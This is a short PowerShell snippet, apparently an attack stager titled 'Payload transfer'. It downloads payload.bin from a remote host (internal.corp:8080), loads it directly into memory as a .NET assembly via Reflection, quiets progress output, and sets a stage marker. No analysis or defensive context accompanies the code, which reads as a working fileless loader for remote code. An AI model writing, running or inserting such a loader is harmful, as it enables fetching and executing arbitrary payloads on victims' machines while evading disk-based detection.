
# Payload transfer
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('http://internal.corp:8080/payload.bin')
[Reflection.Assembly]::Load($ManagedBytes)
$ProgressPreference = "SilentlyContinue"
$StageMarker = "stage-37"
